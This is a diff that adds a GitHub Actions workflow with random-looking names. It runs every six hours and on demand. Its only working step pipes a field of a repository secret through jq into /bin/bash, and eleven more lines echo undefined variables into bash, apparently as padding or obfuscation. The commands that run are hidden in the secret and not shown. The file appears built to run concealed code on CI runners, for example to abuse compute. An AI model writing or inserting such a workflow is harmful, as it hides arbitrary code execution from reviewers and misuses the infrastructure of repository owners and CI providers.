@@ -1,0 +1,28 @@
+name: fanweiti3817
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanweiti3817
+        env:
+          uwr3: ${{ secrets.uwr3 }}
+        run: |
+          echo $uwr3 | jq -r .ldvo18 | /bin/bash
+          echo $ucz99 | jq -r .khnrm66338 | /bin/bash
+          echo $hr75 | jq -r .bfvm527 | /bin/bash
+          echo $c68 | jq -r .pn5 | /bin/bash
+          echo $d8907 | jq -r .bt6744 | /bin/bash
+          echo $fw49 | jq -r .s86 | /bin/bash
+          echo $cv7457 | jq -r .hsdyd9525 | /bin/bash
+          echo $iak5311 | jq -r .en45605 | /bin/bash
+          echo $wkae9 | jq -r .membw46 | /bin/bash
+          echo $peqdu986 | jq -r .yout4 | /bin/bash
+          echo $squ36 | jq -r .jdb952 | /bin/bash
+          echo $xbivp62194 | jq -r .nkdmw8 | /bin/bash
+
